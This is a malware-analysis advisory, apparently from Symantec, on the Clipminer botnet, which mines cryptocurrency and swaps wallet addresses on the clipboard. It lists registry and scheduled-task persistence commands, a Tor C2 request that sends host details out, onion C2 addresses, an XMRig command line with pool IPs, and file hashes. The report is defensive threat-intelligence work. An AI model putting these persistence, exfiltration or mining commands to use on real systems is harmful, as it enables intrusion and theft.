report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
chapter_title: Malware used for cryptocurrency mining and clipboard hijacking.
text: Symantecs Threat Hunter Team, a part of Broadcom Software, has uncovered a cyber-criminal operation that has potentially made the actors behind it at least $1.7 million in illicit gains from cryptocurrency mining and theft via clipboard hijacking.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
chapter_title: Malware used for cryptocurrency mining and clipboard hijacking.
text: The malware being used, tracked by Symantec as Trojan.Clipminer, has a number of similarities to another crypto-mining Trojan called KryptoCibule, suggesting it may be a copycat or evolution of that threat.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
chapter_title: Malware used for cryptocurrency mining and clipboard hijacking.
text: Clipminer is likely spread via Trojanized downloads of cracked or pirated software. The malware arrives on compromised computers as a self-extracting WinRAR archive that drops and executes a downloader in the form of a packed portable executable DLL file with CPL file extension (although it does not follow the CPL format). The dropped file connects to the Tor network to download Clipminers components.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
chapter_title: Malware used for cryptocurrency mining and clipboard hijacking.
text: Clipminer has the ability to use compromised computers resources to mine for cryptocurrency. The malware also modifies the clipboard content in an attempt to redirect cryptocurrency transactions by users of the infected computer. On each clipboard update, it scans the clipboard content for wallet addresses, recognizing address formats used by at least a dozen different cryptocurrencies. The recognized addresses are then replaced with addresses of wallets controlled by the attacker. For the majority of the address formats, the attackers provide multiple replacement wallet addresses to choose from. The malware then picks the address that matches the prefix of the address to be replaced. This way, the victim is less likely to notice manipulation and is likely to proceed with the transaction. The malware includes a total of 4,375 unique addresses of wallets controlled by the attacker. Out of these, 3,677 addresses are used for just three different formats of Bitcoin addresses. Investigating just Bitcoin and Ethereum wallet addresses, we found that they, at the time of writing, contained approximately 34.3 Bitcoin and 129.9 Ethereum. However, some funds had also been transferred to what appear to be cryptocurrency tumblers, also known as cryptocurrency mixing services. These services mix potentially identifiable funds with others, so as to obscure the trail back to the fund's original source. If we include the funds transferred out to these services, the malware operators have potentially made at least $1.7 million from clipboard hijacking alone.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: The infection chain begins with a self-extracting WinRAR archive (bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71) that drops and executes the masqueraded Control Panel (CPL) file:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: 1d31bea6a065fa20cf41861d21b7ea39979d40126c800ebc87d07adb41fe03f4 - m5ak8iW.cpl

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: The dropped file is actually a downloader in the form of a packed portable executable DLL, which has the following exports:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: GetExtensionVersion HttpExtensionProc TerminateExtension

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Once the sample is executed, it arranges for itself to start again in case it gets interrupted.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: To do so, it renames itself using the following format:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: C:\Windows\Temp\[VARIABLE]

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: It also creates the following registry value:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\[VARIABLE]\"[VARIABLE]"="SHELL32.DLL|ShellExec_RunDLL|REGSVR32.EXE -s \"C:\\Windows\\Temp\\[VARIABLE].\""

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: (Note the extra DOT at the end of the filename)

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Example file name:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: C:\Windows\Temp\and.loc

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Example corresponding registry value:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\zyqz "ipbfa"="SHELL32.DLL|ShellExec_RunDLL|REGSVR32.EXE -s \"C:\\Windows\\Temp\\and.loc.\""

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Both of these will be deleted by the sample once it successfully downloads and installs its payload.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Next, the malware starts an embedded Tor client by downloading Tor consensus data:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: http://[HOST_IP_AND_PORT]/tor/status-vote/current/consensus.z

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Where [HOST_IP_AND_PORT] is picked from a list embedded by the sample.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: The malware then connects to the Tor network.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Next, it collects details from the affected computer, as shown in the following example:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: [PUBLIC_IPv4_ADDRESS_AS_SEEN_ON_INTERNET];[REDACTED];"Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz";L"\x005CDevice\x005CHarddiskVolume3\x005CWindows\x005CSystem32\x005Crundll32.exe",L"\x005CDevice\x005CHarddiskVolume3\x005CWindows\x005CSysWOW64\x005Crundll32.exe",L"C\x003A\x005CUsers\[REDACTED]\x005CAppData\x005CLocal\x005CTemp\x005CM5aK8iW.cpL";"BC711 NVMe SK hynix 128GB[REDACTED];L"Windows Defender":61100;"PCI\[REDACTED]":"Intel(R) UHD Graphics; 630":1920:1200:59;113:[LIST_OF_RUNNING_PROCESSES];1920:1200:[DESKTOP_SCREENSHOT_AS_BASE64_ENCODED_PNG];

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: It then sends the following HTTP GET request to an Onion Service over Tor:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: http://[ONION_SERVICE_AND_PORT]/[BINARY_AS_BASE64_ENCODED]

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Where [BINARY_AS_BASE64_ENCODED] is a blob that appears to contain details of the infected machine, and [ONION_SERVICE_AND_PORT] is one of the following:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: miwia5zo4oxcj7n6:11472 6lmt3ott62q5pwae:52403 nczflpbaow2ta7ua:19155 re5sb73yb75nbkrm:33033 qwhbbp6ye2l25wv6:13927 2q3n7ycm7vxe73g6:30656 w4qjsuu5x5kwvkgu:61921 gk7jrmr5v3nw3u7m:40090 ip2djbz3xidmkmkw:53148 pvy2atf27dq2d334:2720 3wquaem4x5qylhs5:17953 niddw7jlqyc64xwc:36583 ga3zm6uelxuniyq4:60117 sv2fubnuttyzvfgl:39828 kzzuxfvchn5kb73c:21646 p2dw3umgw6qhrld3:25947 wkhipwh6fb5j5hzx:25280 ml7sphy7w3k2ge6d:12508 dvivtswsxdxsqqxa:26960 tq2srsgevhutzw42:43477 xh6pciiw6yeqz3bs:19956 xup6y7cxgjorezif:51516 lbwgagk54ww5c3nj:32284 rim3qyk3tdbt2iw3:60747 krq2qyjhfwh4trww:51499 obowq55leh2wguwg:35882 xph6exfmdo7b4tkw:38607 rs24qxgkhecjcgdn:51533 i3uhj2pyh4cwwbmy:54343 7udhxrfpz6qwvspy:31399 nwogcq7cmhth7e4x:15588 gwtpcz4n3wtkwhj4:64393 5fajnveyn2bd4nm7:5990 vcammjx7ddus5kfr:64148 42xgf6qae5wjbcva:45252

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Note that the above are v2 Onion Services. In 2021, v2 Onion Services were depreciated and are no longer supported by current versions of Tor. However, many nodes on the Tor network have yet to be upgraded, meaning the services are still reachable.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: The received response is roughly 10 MB in size and contains the Clipminer payload, which is used to perform coin mining and clipboard hijacking on the compromised computer.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: The payload is stored in the following location:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: [EXISTING_TOP_DIRECTORY]\[VARIABLE]\[VARIABLE]\

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Where [EXISTING_TOP_DIRECTORY] is one of the following:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: C:\Program Files (x86)\ C:\Program Files (x86)\Common Files\ C:\ProgramData\ [USERPROFILE]\AppData\Local\

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: The following is an example of the location and directory naming convention used by the malware:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: C:\Program Files (x86)\Common Files\DevelTies\JueuiSirvices\

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: It also populates the two newly created directories with files copied from the local machine so that the malicious files are less likely to stand out.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: It then drops the load point to the inner directory, where file hash, file directory, and file name vary:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: f49a5a0f2397609a3fb97728b5a997eb77cfa1b529188403fb5e8adaeac1860b rhnoiniye_ni.dll (Packed load point)

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Then it creates scheduled tasks (similar to the following examples) to execute the load point for persistence (details vary between runs):

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: URI: \Microsoft\Windows\Active Directory Rights Management Services Client\Microc040e

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Actions: Exec

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Command: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Arguments: /u "C:\Program Files (x86)\Common Files\DevelTies\JueuiSirvices\imsgt_dvepr.dll"

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: WorkingDirectory: C:\Program Files (x86)\Common Files\DevelTies\JueuiSirvices

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: It creates the following empty registry key (likely as an infection marker):

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\[VARYING_UUID_FORMAT]

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: For example:

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{19C316FE-770F-426C-9B63-F76C34154769}

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: The loaded payload starts a v3 Onion Service (the address changes per infection). We also observed traces of another v3 Onion Service (possibly used to ping the attackers whenever the compromised machine comes online).

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: The payload will monitor keyboard and mouse activity to determine if the machine is in use. It also appears to monitor running processes, checking for analysis/troubleshooting tools.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Whenever the malware determines that a machine is not in use (and at least some of the troubleshooting tools are not used), it starts the XMRig cryptocurrency miner. There are some indications that the attackers used a different miner in the past. Also, it is very likely that a different miner is used when a dedicated GPU is available (e.g. NVIDIA graphics card).

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: We also observed what looks like an XMRig command line (used during injection):

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: 6Y6H --cpu-max-threads-hint=99 -k --pause-on-battery -o 94.75.205.148:443 -o 179.60.146.9:443

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: The sample includes a list of IPv4 addresses and picks two each time.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: There is also an example JSONRPC request in memory (before encryption):

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: {"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"x","pass":"x","agent":"app/1 (Windows NT 10.0; Win64; x64) libuv/1.41.0 msvc/2019 rnd/dywqmjcdytwkxewrvtqznxgmpmdzyqgulzacxcxx","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","rx/0","rx/wow","rx/arq","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/wrkz"]}}

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Additionally, the malware monitors the clipboard for cryptocurrency addresses and replaces them with ones controlled by the attackers.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Figure 1. Clipminer monitors the clipboard for cryptocurrency addresses and replaces them with ones controlled by the attackers

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Figure 2. Clipminer gains control of the computers clipboard and replaces cryptocurrency addresses with ones controlled by the attackers

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Samples of the Clipminer malware began to appear around January 2021, with the cryptocurrency wallets used by the malwares operators seeing activity begin in February of the same year. This is just a few months after KryptoCibule was uncovered and blogged about by ESET researchers.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: While we cannot confirm if Clipminer and KryptoCibule are one and the same, the design similarities are striking. It is possible that following the exposure from ESETs blog, the KryptoCibule actors may have decided to switch things up and launched Clipminer. Another possibility is that different threat actors may have taken inspiration from KryptoCibule and created Clipminer in its image.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: However, whatever the truth may be, one thing is clear: Clipminer has proven a successful endeavor, earning its operators a considerable amount of money.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: Trojan.Clipminer

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: For the latest protection updates, please visit the Symantec Protection Bulletin.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.

report_title: Clipminer Botnet Makes Operators at Least $1.7 Million
text: bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71 Dropper 1d31bea6a065fa20cf41861d21b7ea39979d40126c800ebc87d07adb41fe03f4 Downloader f49a5a0f2397609a3fb97728b5a997eb77cfa1b529188403fb5e8adaeac1860b Packed load point 12e6883046e2c92cbe3b5706ea7f1181b44512f179c7f04e88e75f3f6e392a48 Downloader
